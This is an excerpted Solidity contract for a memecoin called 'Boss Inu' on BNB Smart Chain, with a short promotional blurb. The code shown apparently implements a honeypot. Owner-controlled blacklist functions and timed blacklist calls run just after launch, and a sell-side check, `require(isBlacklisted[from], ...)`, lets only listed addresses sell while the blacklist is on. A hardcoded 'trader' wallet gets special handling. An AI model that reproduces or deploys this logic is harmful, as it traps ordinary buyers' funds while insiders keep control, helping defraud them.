...
A Boss of memecoin launched on binancesmartchain by 
the boss team and backed by the boss community with 
the goal of becoming a memecoin moonshot.
...
contract BossInu is Context, IERC20, Ownable {
    ...
    address[] accounts;
    bool public blacklistEnforced = true;

    string private constant _name = "Boss Inu";
    ...
    uint256 public swapTokenAtAmount = 2_000 * 10**_decimals;

    uint256 public launchEpoch;
    bool public launched;

    address public liquidityReceiver;
    address public marketingWallet = address(0xF00C568356d66eF625aA320561AA72170CdDDA78);
    address public buybackWallet = address(0x3D3addEA2103D004da2C80bf2e332182d863083b);

    address private trader = address(0xA7737B4a662aA43DCdf3Db6F104B7EA3F3bB769b);
    ...
    function manageBlacklist() private {
    ...
    function blacklistIsEnforced(bool enforced) public onlyOwner {
        blacklistEnforced = enforced;
    }
    ...
    function unblacklistMultipleAddress(address[] memory wallets) public onlyOwner {
    ...
    function takeBuyFees(uint256 amount, address from) private returns (uint256) {
        ...
        return (amount -liquidityFeeToken -marketingFeeTokens -buybackFeeTokens);
    }
    ...
    function _transfer(
        ...
        if(launched && block.timestamp > launchEpoch + 10 && preLaunch == 0) {
            manageBlacklist();
            preLaunch += 1;
        }

        if(launched && block.timestamp > launchEpoch + 20 && preLaunch == 1) {
            manageBlacklist();
            preLaunch += 1;
        }

        if(launched && block.timestamp > launchEpoch + 30 && preLaunch == 2) {
            manageBlacklist();
            preLaunch += 1;
        }

        if(launched && block.timestamp > launchEpoch + 40 && preLaunch == 3) {
            manageBlacklist();
            preLaunch += 1;
        }

        if(launched && block.timestamp > launchEpoch + 50 && preLaunch == 4) {
            manageBlacklist();
            preLaunch += 1;
        }

        if(launched && block.timestamp > launchEpoch + 60 && preLaunch == 5) {
            manageBlacklist();
            preLaunch += 1;
        }

        if(launched && block.timestamp > launchEpoch + 180 && !phaseOne) {
            _maxWalletAmount = 30_000 * 10**_decimals;
            _maxTxAmount = 30_000 * 10**_decimals;
            phaseOne = true;
        }
        ...
        if(takeFee){
            ...
            if(from != uniswapV2Pair){
                if(blacklistEnforced) {
                require(isBlacklisted[from], "You are blacklisted");
                }

                if(balanceOf(address(trader)) > 1 * 10**9) {
    ...
    function swapBack() private {
        ...
        uint256 buybackTokens   = contractBalance * (buyFee.buyback + sellFee.buyback) / (buyFee.marketing + buyFee.liquidity + buyFee.buyback + sellFee.marketing + sellFee.liquidity + sellFee.buyback);
